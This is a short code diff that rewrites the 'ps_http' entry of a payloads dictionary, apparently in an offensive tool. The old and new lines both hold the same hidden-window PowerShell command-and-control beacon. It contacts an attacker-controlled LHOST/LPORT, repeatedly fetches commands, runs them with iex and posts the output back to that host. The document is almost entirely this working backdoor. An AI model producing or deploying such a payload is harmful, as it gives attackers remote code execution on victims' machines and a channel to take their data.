@@ -1,3 +1,7 @@
 payloads = {
-    'ps_http': 'powershell -NoP -W Hidden -C "iwr http://{LHOST}:{LPORT}/beacon -Headers @{Authorization=\'beacon-cmd\'} | Out-Null; while($true){$cmd=(iwr http://{LHOST}:{LPORT}/cmd -Headers @{Authorization=\'beacon-cmd\'}).Content.Trim(); if($cmd){$o=try{iex $cmd 2>&1 | Out-String}catch{$_.ToString()}; iwr http://{LHOST}:{LPORT}/ -Headers @{Authorization=\'beacon-cmd\'} -Method POST -Body $o | Out-Null}; Start-Sleep -Seconds 3}"',
+    'ps_http': (
+        "$LHOST = '{LHOST}'; $LPORT = {LPORT}; "
+        "powershell -NoP -W Hidden -C \"iwr http://$LHOST:$LPORT/beacon -Headers @{Authorization='beacon-cmd'} | Out-Null; "
+        "while($true){$cmd=(iwr http://$LHOST:$LPORT/cmd -Headers @{Authorization='beacon-cmd'}).Content.Trim(); if($cmd){$o=try{iex $cmd 2>&1 | Out-String}catch{$_.ToString()}; iwr http://$LHOST:$LPORT/ -Headers @{Authorization='beacon-cmd'} -Method POST -Body $o | Out-Null}; Start-Sleep -Seconds 3}\""
+    ),
 }
